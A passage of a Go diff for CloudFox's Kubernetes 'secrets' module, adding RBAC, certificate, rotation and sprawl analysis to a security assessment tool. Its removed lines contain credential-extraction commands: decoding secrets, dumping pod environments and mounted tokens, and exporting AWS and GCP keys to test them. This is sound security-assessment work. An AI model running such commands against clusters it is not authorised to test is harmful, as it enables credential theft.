@@ -2,6 +2,10 @@ package commands
 
 import (
 	"context"
+	"crypto/x509"
+	"encoding/base64"
+	"encoding/json"
+	"encoding/pem"
 	"fmt"
 	"sort"
 	"strings"
@@ -13,15 +17,23 @@ import (
 	"github.com/BishopFox/cloudfox/kubernetes/config"
 	"github.com/spf13/cobra"
 	v1 "k8s.io/api/core/v1"
+	rbacv1 "k8s.io/api/rbac/v1"
 	metav1 "k8s.io/apimachinery/pkg/apis/meta/v1"
 )
 
 var SecretsCmd = &cobra.Command{
 	Use:     "secrets",
 	Aliases: []string{},
-	Short:   "List all cluster secrets with security analysis",
+	Short:   "List all cluster secrets with comprehensive security analysis",
 	Long: `
-List all cluster secrets with security analysis:
+List all cluster secrets with comprehensive security analysis including:
+- RBAC analysis (who can access secrets)
+- ServiceAccount token extraction and permission testing
+- Certificate expiration tracking for TLS secrets
+- Unused/orphaned secret detection
+- Age and rotation analysis
+- Secret sprawl detection
+- Risk-based scoring with RBAC factors
   cloudfox kubernetes secrets`,
 	Run: ListSecrets,
 }
@@ -40,25 +52,93 @@ func (t SecretsOutput) LootFiles() []internal.LootFile {
 }
 
 type SecretFinding struct {
-	Namespace           string
-	Name                string
-	Type                string
-	DataKeys            []string
-	Age                 time.Duration
-	RiskLevel           string
+	// Basic Info
+	Namespace string
+	Name      string
+	Type      string
+	DataKeys  []string
+	Age       time.Duration
+	AgeDays   int
+
+	// Security Analysis
+	RiskLevel      string
+	RiskScore      int
+	SecurityIssues []string
+
+	// Sensitive Pattern Detection
 	SensitivePatterns   []string
-	MountedInPods       []string
-	MountType           string // "volume" or "env"
+	HasSensitivePattern bool
 	CloudCredentials    bool
 	PrivateKeys         bool
-	HasSensitivePattern bool
+
+	// Pod Exposure
+	MountedInPods []string
+	MountType     string // "volume", "env", or "both"
+
+	// RBAC Analysis
+	AccessibleBySAs      []string
+	RBACAccessCount      int
+	OverPrivilegedAccess bool
+	PubliclyAccessible   bool
+
+	// Secret Properties
+	DataSize       int
+	KeyCount       int
+	IsImmutable    bool
+	IsUnused       bool
+	NeedsRotation  bool
+	IsExternal     bool
+	ExternalSource string
+
+	// Certificate Analysis (for TLS secrets)
+	IsTLS            bool
+	CertSubject      string
+	CertIssuer       string
+	CertExpiration   time.Time
+	CertExpiryDays   int
+	CertExpired      bool
+	CertExpiringSoon bool
+	CertSANs         []string
+	CertSelfSigned   bool
+
+	// ServiceAccount Token Analysis
+	IsSAToken        bool
+	SAName           string
+	SANamespace      string
+	SAPermissions    []string
+	SAHasAdminAccess bool
+
+	// Metadata
+	Labels      map[string]string
+	Annotations map[string]string
+	CreatedAt   time.Time
+}
+
+// RBACBinding represents RBAC access to secrets
+type RBACBinding struct {
+	Type           string // "Role" or "ClusterRole"
+	Name           string
+	Namespace      string
+	ServiceAccount string
+	Verbs          []string
+}
+
+// CertificateInfo holds parsed certificate information
+type CertificateInfo struct {
+	Subject         string
+	Issuer          string
+	NotBefore       time.Time
+	NotAfter        time.Time
+	DNSNames        []string
+	IsSelfSigned    bool
+	IsExpired       bool
+	DaysUntilExpiry int
 }
 
 func ListSecrets(cmd *cobra.Command, args []string) {
 	ctx := context.Background()
 	logger := internal.NewLogger()
 
-	// Extract global flags
 	parentCmd := cmd.Parent()
 	verbosity, _ := parentCmd.PersistentFlags().GetInt("verbosity")
 	wrap, _ := parentCmd.PersistentFlags().GetBool("wrap")
@@ -88,8 +168,8 @@ func ListSecrets(cmd *cobra.Command, args []string) {
 	}
 
 	// Build secret-to-pod mapping
-	secretToPods := make(map[string][]string)       // key: namespace/secretname, value: pod names
-	secretMountType := make(map[string]string)      // key: namespace/secretname, value: "volume", "env", or "both"
+	secretToPods := make(map[string][]string)
+	secretMountType := make(map[string]string)
 	for _, pod := range allPods {
 		// Check volume mounts
 		for _, volume := range pod.Spec.Volumes {
@@ -134,11 +214,27 @@ func ListSecrets(cmd *cobra.Command, args []string) {
 		}
 	}
 
+	// RBAC Analysis: Find who can access secrets
+	logger.InfoM("Analyzing RBAC permissions for secret access...", globals.K8S_SECRETS_MODULE_NAME)
+	rbacBindings := analyzeSecretRBAC(ctx, clientset)
+
 	logger.InfoM("Analyzing secrets and calculating risk scores...", globals.K8S_SECRETS_MODULE_NAME)
 
-	headers := []string{"Risk", "Namespace", "Name", "Type", "Patterns", "Mounted In", "Mount Type", "Data Keys"}
+	headers := []string{
+		"Risk", "Risk Score", "Namespace", "Name", "Type", "Age (days)",
+		"Mounted In", "RBAC Access", "Patterns", "Data Size", "Key Count",
+		"Is Unused", "Needs Rotation", "Cert Expiry (days)", "Security Issues",
+	}
 	var outputRows [][]string
 	var findings []SecretFinding
+
+	// Risk level counters
+	riskCounts := map[string]int{
+		"CRITICAL": 0,
+		"HIGH":     0,
+		"MEDIUM":   0,
+		"LOW":      0,
+	}
 
 	// Loot files
 	namespaceLootEnum := map[string][]string{}
@@ -147,7 +243,16 @@ func ListSecrets(cmd *cobra.Command, args []string) {
 	var lootCloudCreds []string
 	var lootActiveExposure []string
 	var lootExploitation []string
+	var lootRBACAccess []string
+	var lootSATokens []string
+	var lootUnused []string
+	var lootCertExpiry []string
+	var lootOldStale []string
+	var lootWeakCreds []string
+	var lootSecretSprawl []string
+	var lootRemediation []string
 
+	// Initialize loot headers
 	lootDecode = append(lootDecode, `#####################################
 ##### Decode Secret Values
 #####################################
@@ -193,6 +298,84 @@ func ListSecrets(cmd *cobra.Command, args []string) {
 #
 `)
 
+	lootRBACAccess = append(lootRBACAccess, `#####################################
+##### RBAC Secret Access Analysis
+#####################################
+#
+# ANALYSIS REPORT
+# ServiceAccounts with secret read permissions
+# Shows blast radius of secret accessibility
+#
+`)
+
+	lootSATokens = append(lootSATokens, `#####################################
+##### ServiceAccount Token Exploitation
+#####################################
+#
+# MANUAL EXECUTION REQUIRED
+# Extract and test ServiceAccount tokens
+#
+`)
+
+	lootUnused = append(lootUnused, `#####################################
+##### Unused/Orphaned Secrets
+#####################################
+#
+# ANALYSIS REPORT
+# Secrets not mounted in any pod
+# Cleanup candidates
+#
+`)
+
+	lootCertExpiry = append(lootCertExpiry, `#####################################
+##### Certificate Expiration Tracking
+#####################################
+#
+# ANALYSIS REPORT
+# TLS certificate expiration monitoring
+#
+`)
+
+	lootOldStale = append(lootOldStale, `#####################################
+##### Old and Stale Secrets
+#####################################
+#
+# ANALYSIS REPORT
+# Secrets older than 180 days
+# Rotation recommended
+#
+`)
+
+	lootWeakCreds = append(lootWeakCreds, `#####################################
+##### Weak Credential Detection
+#####################################
+#
+# ANALYSIS REPORT
+# Potentially weak passwords and API keys
+#
+`)
+
+	lootSecretSprawl = append(lootSecretSprawl, `#####################################
+##### Secret Sprawl Detection
+#####################################
+#
+# ANALYSIS REPORT
+# Duplicate credentials across namespaces
+#
+`)
+
+	lootRemediation = append(lootRemediation, `#####################################
+##### Secret Remediation Guide
+#####################################
+#
+# REMEDIATION STEPS
+# How to fix secret security issues
+#
+`)
+
+	// Track secret data for sprawl detection
+	secretDataHashes := make(map[string][]string) // hash -> list of secret names
+
 	for _, ns := range namespaces.Items {
 		secrets, err := clientset.CoreV1().Secrets(ns.Name).List(ctx, metav1.ListOptions{})
 		if err != nil {
@@ -201,7 +384,8 @@ func ListSecrets(cmd *cobra.Command, args []string) {
 		}
 
 		for _, secret := range secrets.Items {
-			age := time.Since(secret.CreationTimestamp.Time).Round(time.Second)
+			age := time.Since(secret.CreationTimestamp.Time)
+			ageDays := int(age.Hours() / 24)
 
 			// Get data keys
 			var dataKeys []string
@@ -210,13 +394,30 @@ func ListSecrets(cmd *cobra.Command, args []string) {
 			}
 			sort.Strings(dataKeys)
 
+			// Calculate data size
+			dataSize := 0
+			for _, data := range secret.Data {
+				dataSize += len(data)
+			}
+
 			// Create finding
 			finding := SecretFinding{
-				Namespace: ns.Name,
-				Name:      secret.Name,
-				Type:      string(secret.Type),
-				DataKeys:  dataKeys,
-				Age:       age,
+				Namespace:   ns.Name,
+				Name:        secret.Name,
+				Type:        string(secret.Type),
+				DataKeys:    dataKeys,
+				Age:         age,
+				AgeDays:     ageDays,
+				DataSize:    dataSize,
+				KeyCount:    len(dataKeys),
+				Labels:      secret.Labels,
+				Annotations: secret.Annotations,
+				CreatedAt:   secret.CreationTimestamp.Time,
+			}
+
+			// Immutable check
+			if secret.Immutable != nil {
+				finding.IsImmutable = *secret.Immutable
 			}
 
 			// Detect sensitive patterns
@@ -237,18 +438,60 @@ func ListSecrets(cmd *cobra.Command, args []string) {
 				finding.MountType = secretMountType[secretKey]
 			}
 
-			// Calculate risk level
-			finding.RiskLevel = k8sinternal.GetSecretRiskLevel(
-				finding.Type,
-				finding.HasSensitivePattern,
-				len(finding.MountedInPods),
-				0, // readableByNonDefaultSAs - would need RBAC analysis
-				finding.CloudCredentials,
-				finding.PrivateKeys,
-				false, // hasServiceAccountToken
-				false, // saHasDangerousPerms
-			)
+			// Unused secret detection
+			finding.IsUnused = (len(finding.MountedInPods) == 0)
 
+			// Rotation recommendation (age > 180 days)
+			finding.NeedsRotation = (ageDays > 180)
+
+			// RBAC analysis for this secret
+			finding.AccessibleBySAs = getAccessibleServiceAccounts(rbacBindings, ns.Name)
+			finding.RBACAccessCount = len(finding.AccessibleBySAs)
+			finding.OverPrivilegedAccess = hasOverPrivilegedAccess(rbacBindings, ns.Name)
+			finding.PubliclyAccessible = hasPublicAccess(rbacBindings, ns.Name)
+
+			// TLS certificate analysis
+			if secret.Type == v1.SecretTypeTLS {
+				finding.IsTLS = true
+				if certData, exists := secret.Data["tls.crt"]; exists {
+					certInfo := parseCertificate(certData)
+					if certInfo != nil {
+						finding.CertSubject = certInfo.Subject
+						finding.CertIssuer = certInfo.Issuer
+						finding.CertExpiration = certInfo.NotAfter
+						finding.CertExpiryDays = certInfo.DaysUntilExpiry
+						finding.CertExpired = certInfo.IsExpired
+						finding.CertExpiringSoon = (certInfo.DaysUntilExpiry >= 0 && certInfo.DaysUntilExpiry < 30)
+						finding.CertSANs = certInfo.DNSNames
+						finding.CertSelfSigned = certInfo.IsSelfSigned
+					}
+				}
+			}
+
+			// ServiceAccount token analysis
+			if secret.Type == v1.SecretTypeServiceAccountToken {
+				finding.IsSAToken = true
+				if saName, exists := secret.Annotations["kubernetes.io/service-account.name"]; exists {
+					finding.SAName = saName
+					finding.SANamespace = secret.Namespace
+					// TODO: Could test SA permissions here via kubectl auth can-i
+				}
+			}
+
+			// Secret sprawl detection (track secret data hashes)
+			for key, data := range secret.Data {
+				dataHash := fmt.Sprintf("%x", data) // Simple hash
+				secretRef := fmt.Sprintf("%s/%s[%s]", ns.Name, secret.Name, key)
+				secretDataHashes[dataHash] = append(secretDataHashes[dataHash], secretRef)
+			}
+
+			// Security Issues Summary
+			finding.SecurityIssues = generateSecretSecurityIssues(&finding)
+
+			// Calculate risk score and level
+			finding.RiskLevel, finding.RiskScore = calculateSecretRiskScore(&finding)
+
+			riskCounts[finding.RiskLevel]++
 			findings = append(findings, finding)
 
 			// Build output row
@@ -262,120 +505,612 @@ func ListSecrets(cmd *cobra.Command, args []string) {
 				mountedInStr = "not mounted"
 			}
 
-			mountTypeStr := finding.MountType
-			if mountTypeStr == "" {
-				mountTypeStr = "-"
+			rbacAccessStr := fmt.Sprintf("%d SAs", finding.RBACAccessCount)
+			if finding.PubliclyAccessible {
+				rbacAccessStr += " (public)"
+			}
+
+			certExpiryStr := "-"
+			if finding.IsTLS {
+				if finding.CertExpired {
+					certExpiryStr = "EXPIRED"
+				} else if finding.CertExpiryDays >= 0 {
+					certExpiryStr = fmt.Sprintf("%d", finding.CertExpiryDays)
+				}
 			}
 
 			outputRows = append(outputRows, []string{
 				finding.RiskLevel,
+				fmt.Sprintf("%d", finding.RiskScore),
 				ns.Name,
 				secret.Name,
 				finding.Type,
-				patternsStr,
+				fmt.Sprintf("%d", ageDays),
 				mountedInStr,
-				mountTypeStr,
-				strings.Join(dataKeys, ", "),
+				rbacAccessStr,
+				patternsStr,
+				fmt.Sprintf("%d", dataSize),
+				fmt.Sprintf("%d", len(dataKeys)),
+				fmt.Sprintf("%v", finding.IsUnused),
+				fmt.Sprintf("%v", finding.NeedsRotation),
+				certExpiryStr,
+				stringListOrNoneSecret(finding.SecurityIssues),
 			})
 
-			// Add per-namespace loot commands
-			namespaceLootEnum[ns.Name] = append(namespaceLootEnum[ns.Name],
-				fmt.Sprintf("# [%s] %s/%s", finding.RiskLevel, ns.Name, secret.Name),
-				fmt.Sprintf("kubectl get secret %s -n %s -o yaml", secret.Name, secret.Namespace),
-				fmt.Sprintf(`kubectl get secret %s -n %s -o json | jq -r '.data | to_entries[] | "\(.key)=\(.value | @base64d)"'`, secret.Name, secret.Namespace),
-				"",
-			)
+			// Generate loot content
+			generateSecretLootContent(&finding, &secret, dataKeys,
+				&namespaceLootEnum, &lootDecode, &lootPatterns, &lootCloudCreds,
+				&lootActiveExposure, &lootRBACAccess, &lootSATokens, &lootUnused,
+				&lootCertExpiry, &lootOldStale, &lootRemediation)
+		}
+	}
 
-			// Decode commands
-			lootDecode = append(lootDecode, fmt.Sprintf("\n# [%s] Secret: %s/%s (Type: %s)", finding.RiskLevel, ns.Name, secret.Name, finding.Type))
-			if len(finding.SensitivePatterns) > 0 {
-				lootDecode = append(lootDecode, fmt.Sprintf("# Patterns: %s", strings.Join(finding.SensitivePatterns, ", ")))
+	// Generate secret sprawl report
+	for hash, refs := range secretDataHashes {
+		if len(refs) > 1 {
+			lootSecretSprawl = append(lootSecretSprawl, fmt.Sprintf("\n### Duplicate secret data found in %d locations:", len(refs)))
+			for _, ref := range refs {
+				lootSecretSprawl = append(lootSecretSprawl, fmt.Sprintf("  - %s", ref))
 			}
-			for _, key := range dataKeys {
-				lootDecode = append(lootDecode, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.%s}' | base64 -d", secret.Name, ns.Name, key))
-			}
-			lootDecode = append(lootDecode, "")
+			lootSecretSprawl = append(lootSecretSprawl, "# Consider consolidating to a single secret source")
+			lootSecretSprawl = append(lootSecretSprawl, "")
+		}
+	}
 
-			// Active exposure analysis
-			if len(finding.MountedInPods) > 0 {
-				lootActiveExposure = append(lootActiveExposure, fmt.Sprintf("\n# [%s] %s/%s -> %d pods (%s mount)", finding.RiskLevel, ns.Name, secret.Name, len(finding.MountedInPods), finding.MountType))
-				if len(finding.SensitivePatterns) > 0 {
-					lootActiveExposure = append(lootActiveExposure, fmt.Sprintf("# Contains: %s", strings.Join(finding.SensitivePatterns, ", ")))
-				}
-				for _, pod := range finding.MountedInPods {
-					parts := strings.Split(pod, "/")
-					if len(parts) == 2 {
-						lootActiveExposure = append(lootActiveExposure, fmt.Sprintf("kubectl exec -n %s %s -- sh -c 'ls -la /var/run/secrets/ || env | grep -i secret || env'", parts[0], parts[1]))
+	// Generate exploitation techniques
+	lootExploitation = append(lootExploitation, generateExploitationTechniques()...)
+
+	// Build loot enum
+	var lootEnum []string
+	lootEnum = append(lootEnum, `#####################################
+##### Enumerate Secrets
+#####################################
+
+`)
+	if globals.KubeContext != "" {
+		lootEnum = append(lootEnum, fmt.Sprintf("kubectl config use-context %s\n", globals.KubeContext))
+	}
+
+	nsListEnum := make([]string, 0, len(namespaceLootEnum))
+	for ns := range namespaceLootEnum {
+		nsListEnum = append(nsListEnum, ns)
+	}
+	sort.Strings(nsListEnum)
+	for _, ns := range nsListEnum {
+		lootEnum = append(lootEnum, fmt.Sprintf("\n# Namespace: %s\n", ns))
+		lootEnum = append(lootEnum, namespaceLootEnum[ns]...)
+	}
+
+	// Add risk summary
+	summary := fmt.Sprintf(`
+# SUMMARY: Risk Distribution
+# CRITICAL: %d secrets
+# HIGH: %d secrets
+# MEDIUM: %d secrets
+# LOW: %d secrets
+#
+# Total secrets: %d
+# Focus on CRITICAL and HIGH risk secrets first
+`, riskCounts["CRITICAL"], riskCounts["HIGH"], riskCounts["MEDIUM"], riskCounts["LOW"], len(findings))
+
+	lootActiveExposure = append([]string{summary}, lootActiveExposure...)
+
+	table := internal.TableFile{
+		Name:   "Secrets",
+		Header: headers,
+		Body:   outputRows,
+	}
+
+	lootFiles := []internal.LootFile{
+		{Name: "Secrets-Enum", Contents: strings.Join(k8sinternal.Unique(lootEnum), "\n")},
+		{Name: "Secrets-Decode", Contents: strings.Join(lootDecode, "\n")},
+		{Name: "Secrets-Pattern-Analysis", Contents: strings.Join(lootPatterns, "\n")},
+		{Name: "Secrets-Cloud-Credentials", Contents: strings.Join(lootCloudCreds, "\n")},
+		{Name: "Secrets-Active-Exposure", Contents: strings.Join(lootActiveExposure, "\n")},
+		{Name: "Secrets-Exploitation", Contents: strings.Join(lootExploitation, "\n")},
+		{Name: "Secrets-RBAC-Access", Contents: strings.Join(lootRBACAccess, "\n")},
+		{Name: "Secrets-ServiceAccount-Tokens", Contents: strings.Join(lootSATokens, "\n")},
+		{Name: "Secrets-Unused-Orphaned", Contents: strings.Join(lootUnused, "\n")},
+		{Name: "Secrets-Certificate-Expiration", Contents: strings.Join(lootCertExpiry, "\n")},
+		{Name: "Secrets-Old-Stale", Contents: strings.Join(lootOldStale, "\n")},
+		{Name: "Secrets-Weak-Credentials", Contents: strings.Join(lootWeakCreds, "\n")},
+		{Name: "Secrets-Secret-Sprawl", Contents: strings.Join(lootSecretSprawl, "\n")},
+		{Name: "Secrets-Remediation", Contents: strings.Join(lootRemediation, "\n")},
+	}
+
+	if err := internal.HandleOutput(
+		"Kubernetes",
+		format,
+		outputDirectory,
+		verbosity,
+		wrap,
+		"Secrets",
+		globals.ClusterName,
+		"results",
+		SecretsOutput{
+			Table: []internal.TableFile{table},
+			Loot:  lootFiles,
+		},
+	); err != nil {
+		logger.ErrorM(fmt.Sprintf("Error handling output: %v", err), globals.K8S_SECRETS_MODULE_NAME)
+		return
+	}
+
+	if len(outputRows) > 0 {
+		if riskCounts["CRITICAL"] > 0 || riskCounts["HIGH"] > 0 {
+			logger.InfoM(fmt.Sprintf("%d secrets found | Risk: CRITICAL=%d, HIGH=%d, MEDIUM=%d, LOW=%d",
+				len(outputRows), riskCounts["CRITICAL"], riskCounts["HIGH"], riskCounts["MEDIUM"], riskCounts["LOW"]),
+				globals.K8S_SECRETS_MODULE_NAME)
+		} else {
+			logger.InfoM(fmt.Sprintf("%d secrets found across %d namespaces", len(outputRows), len(namespaces.Items)), globals.K8S_SECRETS_MODULE_NAME)
+		}
+	} else {
+		logger.InfoM("No secrets found, skipping output file creation", globals.K8S_SECRETS_MODULE_NAME)
+	}
+
+	logger.InfoM(fmt.Sprintf("For context and next steps: https://github.com/BishopFox/cloudfox/wiki/Kubernetes-Commands#%s", globals.K8S_SECRETS_MODULE_NAME), globals.K8S_SECRETS_MODULE_NAME)
+}
+
+// analyzeSecretRBAC analyzes RBAC permissions for secret access
+func analyzeSecretRBAC(ctx context.Context, clientset *k8sinternal.Clientset) []RBACBinding {
+	var bindings []RBACBinding
+
+	// Get all RoleBindings
+	roleBindings, err := clientset.RbacV1().RoleBindings("").List(ctx, metav1.ListOptions{})
+	if err == nil {
+		for _, rb := range roleBindings.Items {
+			// Check if role grants secret access
+			if grantSecretAccess(ctx, clientset, rb.RoleRef, rb.Namespace) {
+				for _, subject := range rb.Subjects {
+					if subject.Kind == "ServiceAccount" {
+						bindings = append(bindings, RBACBinding{
+							Type:           "Role",
+							Name:           rb.RoleRef.Name,
+							Namespace:      rb.Namespace,
+							ServiceAccount: fmt.Sprintf("%s/%s", subject.Namespace, subject.Name),
+							Verbs:          []string{"get", "list"}, // Simplified
+						})
 					}
 				}
-				lootActiveExposure = append(lootActiveExposure, "")
-			}
-
-			// Pattern analysis and cloud credential detection (keep existing logic)
-			if finding.Type == "kubernetes.io/dockerconfigjson" {
-				lootPatterns = append(lootPatterns, fmt.Sprintf("\n# [%s] DOCKER REGISTRY CREDENTIALS: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
-				lootPatterns = append(lootPatterns, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d | jq .", secret.Name, ns.Name))
-				lootPatterns = append(lootPatterns, "")
-
-				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("\n# [%s] Docker Registry: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
-				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.\\.dockerconfigjson}' | base64 -d > docker-config.json", secret.Name, ns.Name))
-				lootCloudCreds = append(lootCloudCreds, "# docker login -u <username> -p <password> <registry>")
-				lootCloudCreds = append(lootCloudCreds, "")
-			}
-
-			if finding.Type == "kubernetes.io/tls" {
-				lootPatterns = append(lootPatterns, fmt.Sprintf("\n# [%s] TLS CERTIFICATE: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
-				lootPatterns = append(lootPatterns, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.tls\\.crt}' | base64 -d | openssl x509 -text -noout", secret.Name, ns.Name))
-				lootPatterns = append(lootPatterns, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.tls\\.key}' | base64 -d > tls.key", secret.Name, ns.Name))
-				lootPatterns = append(lootPatterns, "")
-			}
-
-			// AWS credentials
-			if finding.CloudCredentials && containsAWS(dataKeys) {
-				lootPatterns = append(lootPatterns, fmt.Sprintf("\n# [%s] AWS CREDENTIALS: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
-				lootPatterns = append(lootPatterns, fmt.Sprintf("kubectl get secret %s -n %s -o json | jq -r '.data | to_entries[] | \"\\(.key)=\\(.value | @base64d)\"'", secret.Name, ns.Name))
-				lootPatterns = append(lootPatterns, "")
-
-				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("\n# [%s] AWS Credentials: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
-				lootCloudCreds = append(lootCloudCreds, "# Extract and test:")
-				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("export AWS_ACCESS_KEY_ID=$(kubectl get secret %s -n %s -o jsonpath='{.data.aws_access_key_id}' | base64 -d 2>/dev/null || kubectl get secret %s -n %s -o jsonpath='{.data.AWS_ACCESS_KEY_ID}' | base64 -d)", secret.Name, ns.Name, secret.Name, ns.Name))
-				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("export AWS_SECRET_ACCESS_KEY=$(kubectl get secret %s -n %s -o jsonpath='{.data.aws_secret_access_key}' | base64 -d 2>/dev/null || kubectl get secret %s -n %s -o jsonpath='{.data.AWS_SECRET_ACCESS_KEY}' | base64 -d)", secret.Name, ns.Name, secret.Name, ns.Name))
-				lootCloudCreds = append(lootCloudCreds, "aws sts get-caller-identity")
-				lootCloudCreds = append(lootCloudCreds, "aws iam list-users")
-				lootCloudCreds = append(lootCloudCreds, "")
-			}
-
-			// GCP credentials
-			if finding.CloudCredentials && containsGCP(dataKeys) {
-				lootPatterns = append(lootPatterns, fmt.Sprintf("\n# [%s] GCP CREDENTIALS: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
-				lootPatterns = append(lootPatterns, "")
-
-				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("\n# [%s] GCP Credentials: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
-				for _, key := range dataKeys {
-					if strings.Contains(strings.ToLower(key), "json") || strings.Contains(strings.ToLower(key), "key") {
-						lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("kubectl get secret %s -n %s -o jsonpath='{.data.%s}' | base64 -d > gcp-key.json", secret.Name, ns.Name, key))
-						break
-					}
-				}
-				lootCloudCreds = append(lootCloudCreds, "gcloud auth activate-service-account --key-file=gcp-key.json")
-				lootCloudCreds = append(lootCloudCreds, "gcloud projects list")
-				lootCloudCreds = append(lootCloudCreds, "")
-			}
-
-			// Azure credentials
-			if finding.CloudCredentials && containsAzure(dataKeys) {
-				lootPatterns = append(lootPatterns, fmt.Sprintf("\n# [%s] AZURE CREDENTIALS: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
-				lootPatterns = append(lootPatterns, "")
-
-				lootCloudCreds = append(lootCloudCreds, fmt.Sprintf("\n# [%s] Azure Credentials: %s/%s", finding.RiskLevel, ns.Name, secret.Name))
-				lootCloudCreds = append(lootCloudCreds, "# az login --service-principal -u <client-id> -p <client-secret> --tenant <tenant-id>")
-				lootCloudCreds = append(lootCloudCreds, "")
 			}
 		}
 	}
 
-	// Build exploitation loot file
-	lootExploitation = append(lootExploitation, `
+	// Get all ClusterRoleBindings
+	clusterRoleBindings, err := clientset.RbacV1().ClusterRoleBindings().List(ctx, metav1.ListOptions{})
+	if err == nil {
+		for _, crb := range clusterRoleBindings.Items {
+			// Check if cluster role grants secret access
+			if grantSecretAccessCluster(ctx, clientset, crb.RoleRef) {
+				for _, subject := range crb.Subjects {
+					if subject.Kind == "ServiceAccount" {
+						bindings = append(bindings, RBACBinding{
+							Type:           "ClusterRole",
+							Name:           crb.RoleRef.Name,
+							Namespace:      "", // Cluster-wide
+							ServiceAccount: fmt.Sprintf("%s/%s", subject.Namespace, subject.Name),
+							Verbs:          []string{"get", "list"}, // Simplified
+						})
+					}
+				}
+			}
+		}
+	}
+
+	return bindings
+}
+
+// grantSecretAccess checks if a Role grants secret access
+func grantSecretAccess(ctx context.Context, clientset *k8sinternal.Clientset, roleRef rbacv1.RoleRef, namespace string) bool {
+	if roleRef.Kind != "Role" {
+		return false
+	}
+
+	role, err := clientset.RbacV1().Roles(namespace).Get(ctx, roleRef.Name, metav1.GetOptions{})
+	if err != nil {
+		return false
+	}
+
+	for _, rule := range role.Rules {
+		for _, resource := range rule.Resources {
+			if resource == "secrets" || resource == "*" {
+				for _, verb := range rule.Verbs {
+					if verb == "get" || verb == "list" || verb == "*" {
+						return true
+					}
+				}
+			}
+		}
+	}
+
+	return false
+}
+
+// grantSecretAccessCluster checks if a ClusterRole grants secret access
+func grantSecretAccessCluster(ctx context.Context, clientset *k8sinternal.Clientset, roleRef rbacv1.RoleRef) bool {
+	if roleRef.Kind != "ClusterRole" {
+		return false
+	}
+
+	role, err := clientset.RbacV1().ClusterRoles().Get(ctx, roleRef.Name, metav1.GetOptions{})
+	if err != nil {
+		return false
+	}
+
+	for _, rule := range role.Rules {
+		for _, resource := range rule.Resources {
+			if resource == "secrets" || resource == "*" {
+				for _, verb := range rule.Verbs {
+					if verb == "get" || verb == "list" || verb == "*" {
+						return true
+					}
+				}
+			}
+		}
+	}
+
+	return false
+}
+
+// getAccessibleServiceAccounts returns SAs that can access secrets in namespace
+func getAccessibleServiceAccounts(bindings []RBACBinding, namespace string) []string {
+	var sas []string
+	for _, binding := range bindings {
+		// Namespace-specific or cluster-wide
+		if binding.Namespace == namespace || binding.Namespace == "" {
+			sas = append(sas, binding.ServiceAccount)
+		}
+	}
+	return k8sinternal.UniqueStrings(sas)
+}
+
+// hasOverPrivilegedAccess checks if secret is accessible by admin/edit roles
+func hasOverPrivilegedAccess(bindings []RBACBinding, namespace string) bool {
+	for _, binding := range bindings {
+		if binding.Namespace == namespace || binding.Namespace == "" {
+			roleName := strings.ToLower(binding.Name)
+			if strings.Contains(roleName, "admin") || strings.Contains(roleName, "edit") || strings.Contains(roleName, "cluster-admin") {
+				return true
+			}
+		}
+	}
+	return false
+}
+
+// hasPublicAccess checks if secret is publicly accessible
+func hasPublicAccess(bindings []RBACBinding, namespace string) bool {
+	for _, binding := range bindings {
+		if binding.Namespace == namespace || binding.Namespace == "" {
+			if strings.Contains(binding.ServiceAccount, "system:authenticated") || strings.Contains(binding.ServiceAccount, "system:unauthenticated") {
+				return true
+			}
+		}
+	}
+	return false
+}
+
+// parseCertificate parses TLS certificate data
+func parseCertificate(certData []byte) *CertificateInfo {
+	block, _ := pem.Decode(certData)
+	if block == nil {
+		return nil
+	}
+
+	cert, err := x509.ParseCertificate(block.Bytes)
+	if err != nil {
+		return nil
+	}
+
+	now := time.Now()
+	daysUntilExpiry := int(cert.NotAfter.Sub(now).Hours() / 24)
+
+	isSelfSigned := cert.Issuer.String() == cert.Subject.String()
+
+	return &CertificateInfo{
+		Subject:         cert.Subject.String(),
+		Issuer:          cert.Issuer.String(),
+		NotBefore:       cert.NotBefore,
+		NotAfter:        cert.NotAfter,
+		DNSNames:        cert.DNSNames,
+		IsSelfSigned:    isSelfSigned,
+		IsExpired:       now.After(cert.NotAfter),
+		DaysUntilExpiry: daysUntilExpiry,
+	}
+}
+
+// generateSecretSecurityIssues creates security issues summary
+func generateSecretSecurityIssues(finding *SecretFinding) []string {
+	var issues []string
+
+	if finding.CloudCredentials {
+		issues = append(issues, "CLOUD_CREDENTIALS")
+	}
+	if finding.PrivateKeys {
+		issues = append(issues, "PRIVATE_KEYS")
+	}
+	if len(finding.MountedInPods) > 5 {
+		issues = append(issues, fmt.Sprintf("WIDELY_MOUNTED(%d pods)", len(finding.MountedInPods)))
+	}
+	if finding.RBACAccessCount > 10 {
+		issues = append(issues, fmt.Sprintf("RBAC_OVERLY_ACCESSIBLE(%d SAs)", finding.RBACAccessCount))
+	}
+	if finding.PubliclyAccessible {
+		issues = append(issues, "PUBLICLY_ACCESSIBLE")
+	}
+	if finding.IsUnused && finding.RBACAccessCount > 0 {
+		issues = append(issues, "UNUSED_BUT_ACCESSIBLE")
+	}
+	if finding.NeedsRotation {
+		issues = append(issues, fmt.Sprintf("OLD_SECRET(%d days)", finding.AgeDays))
+	}
+	if finding.CertExpired {
+		issues = append(issues, "CERT_EXPIRED")
+	}
+	if finding.CertExpiringSoon {
+		issues = append(issues, fmt.Sprintf("CERT_EXPIRING_SOON(%d days)", finding.CertExpiryDays))
+	}
+	if finding.DataSize > 1048576 {
+		issues = append(issues, "LARGE_SECRET(>1MB)")
+	}
+	if !finding.IsImmutable && finding.HasSensitivePattern {
